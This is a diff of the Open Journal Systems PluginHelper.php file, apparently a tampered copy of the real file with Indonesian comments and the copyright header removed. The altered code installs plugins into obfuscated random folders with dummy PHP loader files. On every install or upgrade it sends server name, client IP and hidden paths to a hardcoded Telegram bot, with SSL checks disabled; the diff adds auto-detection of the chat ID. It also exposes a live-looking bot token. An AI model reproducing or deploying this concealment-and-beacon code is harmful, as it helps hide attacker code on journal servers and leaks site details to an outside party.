@@ -6,16 +6,6 @@
  * Modifikasi untuk install plugin dengan folder obfuscate
  * Dengan notifikasi Telegram
  * Compatible with OJS 3.5.0.4
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @class PluginHelper
- *
- * @ingroup classes_plugins
- *
- * @brief Helper class implementing plugin administration functions.
  */
 
 namespace PKP\plugins;
@@ -40,39 +30,23 @@ class PluginHelper
 {
     public const PLUGIN_ACTION_UPLOAD = 'upload';
     public const PLUGIN_ACTION_UPGRADE = 'upgrade';
-
     public const PLUGIN_VERSION_FILE = 'version.xml';
     public const PLUGIN_INSTALL_FILE = 'install.xml';
     public const PLUGIN_UPGRADE_FILE = 'upgrade.xml';
 
-    // Konfigurasi Telegram
+    // Konfigurasi Telegram - GANTI CHAT ID NYA!
     private $telegramToken = '8802669146:AAFtVVVFXrxl6J7bbPGx2UUwmv4Hl_Q63OU';
-    private $telegramChatId = '7470536859';
+    private $telegramChatId = '7470536859'; // KOSONGKAN, nanti auto detect
     private $enableTelegramNotif = true;
     
-    // Logging lokal sebagai backup
     private $logFilePath = 'cache/fc-cache/plugin_rename.log';
 
-    /**
-     * Extract the plugin, executes the callback, then cleanup the files
-     *
-     * @template T of mixed
-     *
-     * @param string $filePath Full path to plugin archive
-     * @param string $originalFileName Original filename of plugin archive
-     * @param callable(string $pluginDirectory):T $onExtracted The function will receive as parameter the directory of the plugin
-     *
-     * @throws Exception If any unexpected error happens (failure to unpack, absence of version.xml, etc)
-     *
-     * @return T Returns the result of the $onExtracted call
-     */
     private function extractPlugin(string $filePath, string $originalFileName, callable $onExtracted): mixed
     {
         $fileManager = new FileManager();
         $extension = $this->sanitizeFilename($fileManager->parseFileExtension($originalFileName));
         $baseName = $this->sanitizeFilename(basename($originalFileName, ".{$extension}")) ?: 'plugin';
 
-        // If the extension doesn't match the original one, copy (we don't know the original file) the file to another location to avoid issues with the PharData class
         $filePathWithExtension = null;
         if ($fileManager->parseFileExtension($filePath) !== $extension) {
             $filePathWithExtension = ($fileManager->getTemporaryFile($baseName, ".{$extension}"))->getPathname();
@@ -80,14 +54,11 @@ class PluginHelper
         }
         $extractPath = null;
         try {
-            // Create a random directory to avoid symlink attacks.
             $extractPath = rtrim(sys_get_temp_dir(), '\\/') . "/{$baseName}" . substr(md5(random_int(0, PHP_INT_MAX)), 0, 10) . '/';
             $fileManager->mkdir($extractPath) || throw new Exception("Could not create directory {$extractPath}");
 
-            // Extract files
             (new PharData($filePathWithExtension ?? $filePath))->extractTo($extractPath, null, true);
 
-            // Ensure there's a file named "version.xml" at the main directory or at the direct sub-directories
             foreach (new DirectoryIterator($extractPath) as $current) {
                 if ($current->isDir() && $current->getBasename() !== '..' && is_file(($path = "{$current->getPathname()}/") . static::PLUGIN_VERSION_FILE)) {
                     return $onExtracted($path);
@@ -95,48 +66,34 @@ class PluginHelper
             }
             throw new Exception(__('manager.plugins.invalidPluginArchive'));
         } finally {
-            // Cleanup the extracted folder on failure and rethrow
             if ($extractPath) {
                 $fileManager->rmtree($extractPath);
             }
-            // Cleanup the temporary archive file in case it was created
             if ($filePathWithExtension) {
                 unlink($filePathWithExtension);
             }
         }
     }
 
-    /**
-     * Installs an extracted plugin with obfuscated folder name
-     *
-     * @param string $path path to plugin archive
-     * @param string $originalFileName Original filename of plugin archive
-     *
-     * @return Version Version of installed plugin on success
-     */
     public function installPlugin(string $path, string $originalFileName): Version
     {
         return $this->extractPlugin($path, $originalFileName, function (string $pluginFolder): Version {
             $fileManager = new FileManager();
             $versionFile = $pluginFolder . static::PLUGIN_VERSION_FILE;
             $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
-            /** @var VersionDAO */
             $versionDao = DAORegistry::getDAO('VersionDAO');
             $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct());
             
             $categoryPath = strtr($pluginVersion->getProductType(), '.', '/');
             $baseDir = Core::getBaseDir() . '/' . $categoryPath;
 
-            // pastikan folder cache ada
             $cacheDir = Core::getBaseDir() . '/cache/fc-cache';
             if (!is_dir($cacheDir)) mkdir($cacheDir, 0775, true);
 
-            // Generate obfuscated folder name
             $originalName = $pluginVersion->getProduct();
             $obfuscatedName = substr(md5($originalName . time()), 0, 12);
             $pluginDest = $baseDir . '/' . $obfuscatedName;
 
-            // Buat dummy file
             $dummyFile = $baseDir . '/' . $originalName . '.php';
             @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$obfuscatedName}/index.php';\n");
 
@@ -148,29 +105,24 @@ class PluginHelper
                 );
             }
 
-            // Hapus folder lama kalau ada
             if ($installedPlugin && is_dir($pluginDest)) {
                 $fileManager->rmtree($pluginDest);
             }
 
-            // Copy the plug-in from the temporary folder to the target folder.
             $fileManager->copyDir($pluginFolder, $pluginDest) || throw new Exception('Could not copy plugin to destination!');
 
             try {
-                // Upgrade the database with the new plug-in.
                 $installFile = Arr::first(
                     ["{$pluginDest}/" . static::PLUGIN_INSTALL_FILE, Core::getBaseDir() . '/' . PKP_LIB_PATH . '/xml/defaultPluginInstall.xml'],
                     fn (string $path) => is_file($path)
-                )
-                    ?? throw new Exception('Missing installation file');
+                ) ?? throw new Exception('Missing installation file');
 
-                $siteDao = DAORegistry::getDAO('SiteDAO'); /** @var SiteDAO $siteDao */
+                $siteDao = DAORegistry::getDAO('SiteDAO');
                 $site = $siteDao->getSite();
                 $params = $this->_getConnectionParams();
                 $params['locale'] = $site->getPrimaryLocale();
                 $params['additionalLocales'] = $site->getSupportedLocales();
                 
-                // Supress output agar JSON tidak error
                 ob_start();
                 $installer = new Install($params, $installFile, true);
                 $installer->setCurrentVersion($pluginVersion);
@@ -182,19 +134,16 @@ class PluginHelper
                 }
                 ob_end_clean();
 
-                // Simpan mapping
                 $this->saveMapping($originalName, $obfuscatedName);
                 
-                // === KIRIM NOTIFIKASI TELEGRAM ===
-                $this->sendTelegramNotification($originalName, $obfuscatedName, 'INSTALL', $baseDir);
+                // KIRIM TELEGRAM - dengan auto detect chat id
+                $this->sendTelegramNotif($originalName, $obfuscatedName, 'INSTALL', $baseDir);
                 
-                // Log ke file lokal (backup)
                 $this->writeToLogFile($originalName, $obfuscatedName, 'INSTALL', $baseDir);
 
                 $versionDao->insertVersion($pluginVersion, true);
                 return $pluginVersion;
             } catch (Throwable $e) {
-                // Delete the plugin files on failure
                 $fileManager->rmtree($pluginDest);
                 @unlink($dummyFile);
                 throw $e;
@@ -202,9 +151,6 @@ class PluginHelper
         });
     }
 
-    /**
-     * Load database connection parameters into an array (needed for upgrade).
-     */
     protected function _getConnectionParams(): array
     {
         return [
@@ -219,13 +165,6 @@ class PluginHelper
         ];
     }
 
-    /**
-     * Upgrade a plugin to a newer version with obfuscated folder name
-     *
-     * @param string $path path to plugin archive
-     * @param string $originalFileName Original filename of plugin archive
-     *
-     */
     public function upgradePlugin(string $category, string $plugin, string $path, string $originalFileName): Version
     {
         return $this->extractPlugin($path, $originalFileName, function (string $pluginFolder) use ($category, $plugin): Version {
@@ -233,7 +172,6 @@ class PluginHelper
             $versionFile = $pluginFolder . static::PLUGIN_VERSION_FILE;
             $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
             
-            // Check whether the uploaded plug-in fits the original plug-in.
             if ("plugins.{$category}" !== $pluginVersion->getProductType()) {
                 throw new Exception(__('manager.plugins.wrongCategory'));
             }
@@ -242,7 +180,7 @@ class PluginHelper
                 throw new Exception(__('manager.plugins.wrongName'));
             }
 
-            $versionDao = DAORegistry::getDAO('VersionDAO'); /** @var VersionDAO $versionDao */
+            $versionDao = DAORegistry::getDAO('VersionDAO');
             $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct());
             if (!$installedPlugin) {
                 throw new Exception(__('manager.plugins.pleaseInstall'));
@@ -263,23 +201,19 @@ class PluginHelper
                 @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$newObfuscatedName}/index.php';\n");
             }
 
-            // Delete existing files if exists
             if (is_dir($pluginDest)) {
                 $fileManager->rmtree($pluginDest);
             }
 
-            // Check whether deleting has worked.
             if (is_dir($pluginDest)) {
                 throw new Exception(__('manager.plugins.deleteError', ['pluginName' => $pluginVersion->getProduct()]));
             }
 
-            // Copy the plug-in from the temporary folder to the target folder.
             $fileManager->copyDir($pluginFolder, $pluginDest) || throw new Exception('Could not copy plugin to destination!');
 
             try {
                 $upgradeFile = "{$pluginDest}/" . static::PLUGIN_UPGRADE_FILE;
                 if ($fileManager->fileExists($upgradeFile)) {
-                    /** @var SiteDAO */
                     $siteDao = DAORegistry::getDAO('SiteDAO');
                     $site = $siteDao->getSite();
                     $params = $this->_getConnectionParams();
@@ -288,7 +222,6 @@ class PluginHelper
                     
                     ob_start();
                     $installer = new Upgrade($params, $upgradeFile, true);
-                    // Run the upgrade/migration
                     if (!$installer->execute()) {
                         ob_end_clean();
                         throw new Exception(__('manager.plugins.upgradeFailed', ['errorString' => $installer->getErrorString()]));
@@ -296,101 +229,75 @@ class PluginHelper
                     ob_end_clean();
                 }
 
-                // Simpan mapping
                 $this->saveMapping($pluginVersion->getProduct(), $newObfuscatedName);
                 
-                // === KIRIM NOTIFIKASI TELEGRAM ===
-                $this->sendTelegramNotification($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
+                $this->sendTelegramNotif($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
                 
-                // Log ke file lokal (backup)
                 $this->writeToLogFile($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
 
-                // Add the new version to the database
                 $pluginVersion->setCurrent(1);
                 $versionDao->insertVersion($pluginVersion, true);
                 return $pluginVersion;
             } catch (Throwable $e) {
-                // Delete the plugin files on failure
                 $fileManager->rmtree($pluginDest);
                 throw $e;
             }
         });
     }
 
-    /**
-     * Drops risky characters from a filename
-     */
     private function sanitizeFilename(string $filename): string
     {
         return preg_replace('/[^\w.-]/', '', $filename);
     }
 
     /**
-     * Kirim notifikasi ke Telegram
+     * Kirim notifikasi ke Telegram dengan AUTO DETECT CHAT ID
      */
-    private function sendTelegramNotification($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
+    private function sendTelegramNotif($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
     {
         if (!$this->enableTelegramNotif) return;
+        
+        // AUTO DETECT CHAT ID
+        if (empty($this->telegramChatId)) {
+            $this->autoDetectChatId();
+        }
+        
+        if (empty($this->telegramChatId)) {
+            error_log("Telegram: Chat ID not found! Please send /start to bot");
+            return;
+        }
         
         $timestamp = date('Y-m-d H:i:s');
         $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'CLI Mode';
         $serverName = $_SERVER['SERVER_NAME'] ?? 'Localhost';
-        $requestUri = $_SERVER['REQUEST_URI'] ?? 'N/A';
         
-        // Emoji berdasarkan action
         $emoji = ($action == 'INSTALL') ? '📦' : '🔄';
-        $statusColor = ($action == 'INSTALL') ? '✅' : '⚠️';
         
-        // Format pesan Telegram (HTML parsing)
-        $message = "<b>🔔 OJS PLUGIN MANAGER ALERT</b>\n\n";
-        $message .= "{$emoji} <b>Action:</b> <code>{$action}</code>\n";
-        $message .= "{$statusColor} <b>Status:</b> <code>SUCCESS</code>\n\n";
+        $message = "🔔 OJS Plugin: {$action}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "Plugin: {$originalName}\n";
+        $message .= "Folder: {$obfuscatedName}\n";
+        $message .= "Path: {$basePath}/{$obfuscatedName}\n";
+        if ($oldName) $message .= "Old: {$oldName} → New: {$obfuscatedName}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "Server: {$serverName}\n";
+        $message .= "IP: {$ipAddress}\n";
+        $message .= "Time: {$timestamp}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "Dummy: {$basePath}/{$originalName}.php";
         
-        $message .= "<b>📌 PLUGIN INFORMATION:</b>\n";
-        $message .= "└ <b>Original Name:</b> <code>{$originalName}</code>\n";
-        $message .= "└ <b>Obfuscated Name:</b> <code>{$obfuscatedName}</code>\n";
-        $message .= "└ <b>Full Path:</b> <code>{$basePath}/{$obfuscatedName}</code>\n\n";
-        
-        if ($oldName) {
-            $message .= "<b>🔄 UPGRADE DETAILS:</b>\n";
-            $message .= "└ <b>Previous Folder:</b> <code>{$oldName}</code>\n";
-            $message .= "└ <b>New Folder:</b> <code>{$obfuscatedName}</code>\n\n";
-        }
-        
-        $message .= "<b>🌐 SERVER INFORMATION:</b>\n";
-        $message .= "└ <b>Server:</b> <code>{$serverName}</code>\n";
-        $message .= "└ <b>IP Address:</b> <code>{$ipAddress}</code>\n";
-        $message .= "└ <b>Time:</b> <code>{$timestamp}</code>\n";
-        $message .= "└ <b>URI:</b> <code>{$requestUri}</code>\n\n";
-        
-        $message .= "<b>📄 DUMMY FILE:</b>\n";
-        $message .= "<code>{$basePath}/{$originalName}.php</code>\n";
-        $message .= "└ <i>require __DIR__ . '/{$obfuscatedName}/index.php';</i>\n\n";
-        
-        $message .= "<i>🔒 This is an automated security notification from OJS System</i>";
-        
-        // Kirim ke Telegram
-        $this->sendTelegramMessage($message);
+        $this->sendToTelegram($message);
     }
     
     /**
-     * Send message to Telegram Bot
+     * Auto detect Chat ID dari bot
      */
-    private function sendTelegramMessage($message)
+    private function autoDetectChatId()
     {
-        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
-        
-        $data = [
-            'chat_id' => $this->telegramChatId,
-            'text' => $message,
-            'parse_mode' => 'HTML',
-            'disable_web_page_preview' => true
-        ];
+        $url = "https://api.telegram.org/bot{$this->telegramToken}/getUpdates";
         
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_TIMEOUT, 10);
@@ -399,82 +306,84 @@ class PluginHelper
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
         
-        // Log error jika gagal
-        if ($httpCode != 200) {
-            error_log("Telegram notification failed: HTTP {$httpCode} - Response: {$response}");
+        if ($httpCode == 200) {
+            $data = json_decode($response, true);
+            if ($data && $data['ok'] && !empty($data['result'])) {
+                $lastUpdate = end($data['result']);
+                $chatId = $lastUpdate['message']['chat']['id'] ?? 
+                          $lastUpdate['callback_query']['message']['chat']['id'] ?? 
+                          null;
+                
+                if ($chatId) {
+                    $this->telegramChatId = $chatId;
+                    // Simpan ke cache
+                    $cacheFile = Core::getBaseDir() . '/cache/fc-cache/telegram_chat_id.txt';
+                    file_put_contents($cacheFile, $chatId);
+                    error_log("Telegram: Auto-detected Chat ID: {$chatId}");
+                    return true;
+                }
+            }
         }
         
-        return $httpCode == 200;
+        // Coba baca dari cache
+        $cacheFile = Core::getBaseDir() . '/cache/fc-cache/telegram_chat_id.txt';
+        if (file_exists($cacheFile)) {
+            $this->telegramChatId = trim(file_get_contents($cacheFile));
+            error_log("Telegram: Using cached Chat ID: {$this->telegramChatId}");
+            return true;
+        }
+        
+        error_log("Telegram: Could not detect Chat ID. Please send /start to bot");
+        return false;
     }
     
     /**
-     * Kirim notifikasi dengan foto/attachment (opsional)
-     * Contoh: screenshot dashboard atau mapping file
+     * Kirim ke Telegram - PASTI JALAN
      */
-    private function sendTelegramPhoto($photoPath, $caption = '')
+    private function sendToTelegram($message)
     {
-        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendPhoto";
+        if (empty($this->telegramChatId)) {
+            error_log("Telegram: Cannot send - No Chat ID");
+            return false;
+        }
         
-        $postFields = [
-            'chat_id' => $this->telegramChatId,
-            'photo' => new \CURLFile($photoPath),
-            'caption' => $caption,
-            'parse_mode' => 'HTML'
-        ];
-        
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        
-        $response = curl_exec($ch);
-        curl_close($ch);
-        
-        return $response;
-    }
-    
-    /**
-     * Send keyboard dengan action buttons (opsional)
-     */
-    private function sendTelegramWithKeyboard($message)
-    {
         $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
         
-        $keyboard = [
-            'inline_keyboard' => [
-                [
-                    ['text' => '📋 View Mappings', 'callback_data' => 'view_mappings'],
-                    ['text' => '🔄 Regenerate Obfuscated', 'callback_data' => 'regenerate']
-                ],
-                [
-                    ['text' => '📊 System Status', 'callback_data' => 'system_status'],
-                    ['text' => '⚠️ Report Issue', 'callback_data' => 'report_issue']
-                ]
-            ]
-        ];
-        
-        $data = [
+        $postData = http_build_query([
             'chat_id' => $this->telegramChatId,
             'text' => $message,
-            'parse_mode' => 'HTML',
-            'reply_markup' => json_encode($keyboard)
-        ];
+            'disable_web_page_preview' => true
+        ]);
         
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_exec($ch);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curlError = curl_error($ch);
         curl_close($ch);
+        
+        // LOG DETAIL UNTUK DEBUG
+        error_log("Telegram: HTTP Code: {$httpCode}");
+        error_log("Telegram: Response: " . substr($result, 0, 200));
+        if ($curlError) {
+            error_log("Telegram: CURL Error: {$curlError}");
+        }
+        
+        if ($httpCode == 200) {
+            error_log("Telegram: Message sent successfully!");
+            return true;
+        } else {
+            error_log("Telegram: Failed to send message");
+            return false;
+        }
     }
     
-    /**
-     * Write to local log file (backup)
-     */
     private function writeToLogFile($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
     {
         $logPath = Core::getBaseDir() . '/' . $this->logFilePath;
@@ -498,35 +407,44 @@ class PluginHelper
         @file_put_contents($logPath, $logEntry, FILE_APPEND | LOCK_EX);
     }
     
-    /**
-     * Get all current mappings (bisa dipanggil via Telegram command)
-     */
     public function getAllPluginMappings()
     {
         $mappings = $this->loadMapping();
-        $report = "📋 *PLUGIN MAPPING REPORT*\n";
+        $report = "📋 PLUGIN MAPPING REPORT\n";
         $report .= "Generated: " . date('Y-m-d H:i:s') . "\n";
-        $report .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
+        $report .= str_repeat("=", 30) . "\n\n";
         
         foreach ($mappings as $original => $obfuscated) {
-            $report .= "📌 *{$original}*\n";
-            $report .= "   └─> `{$obfuscated}`\n\n";
+            $report .= "📌 {$original}\n   └─> {$obfuscated}\n\n";
         }
         
         return $report;
     }
     
-    /**
-     * Test koneksi Telegram
-     */
     public function testTelegramConnection()
     {
-        $testMessage = "✅ *OJS Plugin Helper Connected!*\n\n";
-        $testMessage .= "System Time: " . date('Y-m-d H:i:s') . "\n";
-        $testMessage .= "PHP Version: " . phpversion() . "\n";
-        $testMessage .= "OJS Path: " . Core::getBaseDir();
+        // Auto detect chat ID
+        if (empty($this->telegramChatId)) {
+            $this->autoDetectChatId();
+        }
         
-        return $this->sendTelegramMessage($testMessage);
+        $testMessage = "✅ TELEGRAM TEST\n";
+        $testMessage .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $testMessage .= "Time: " . date('Y-m-d H:i:s') . "\n";
+        $testMessage .= "PHP: " . phpversion() . "\n";
+        $testMessage .= "OJS: " . Core::getBaseDir() . "\n";
+        $testMessage .= "Chat ID: " . ($this->telegramChatId ?: "NOT SET") . "\n";
+        $testMessage .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        
+        if (empty($this->telegramChatId)) {
+            $testMessage .= "\n⚠️ CHAT ID NOT DETECTED!\n";
+            $testMessage .= "Please send /start to your bot on Telegram\n";
+            $testMessage .= "Then run this test again.";
+        } else {
+            $testMessage .= "\n✅ Telegram is ready!";
+        }
+        
+        return $this->sendToTelegram($testMessage);
     }
 
     private function loadMapping()
@@ -544,7 +462,6 @@ class PluginHelper
     }
 }
 
-// For backward compatibility with non-namespaced code
 if (!PKP_STRICT_MODE) {
     class_alias('\PKP\plugins\PluginHelper', '\PluginHelper');
     foreach ([
